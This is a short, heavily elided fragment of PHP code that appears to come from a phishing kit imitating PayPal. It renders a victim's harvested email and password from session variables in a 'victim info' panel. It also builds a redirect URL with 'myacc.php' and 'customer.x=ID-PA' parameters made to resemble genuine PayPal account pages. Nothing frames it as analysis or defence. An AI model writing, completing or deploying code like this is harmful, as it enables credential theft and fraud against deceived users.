<?php
	...
	* { margin: 0; font-family: Orbitron, verdana; font-size: 13px; }
	...
	<body>
		...
		<div class="content">
			<div class="box">
				...
				<div class="infos">
					<div class="dhead">Email:</div>
					<div class="data">'.$_SESSION['xysemailx'].'</div><br>
					<div class="dhead">Password:</div>
					<div class="data">'.$_SESSION['xyspassx'].'</div><br>
				</div>
				<div class="infosvic">
	...
	$xDIRx = "myacc.php?country.x=".$countryCode."&locale.x=".getLG($countryCode)."_".$countryCode."&customer.x=ID-PA".$hash."&safety=".$hash2;
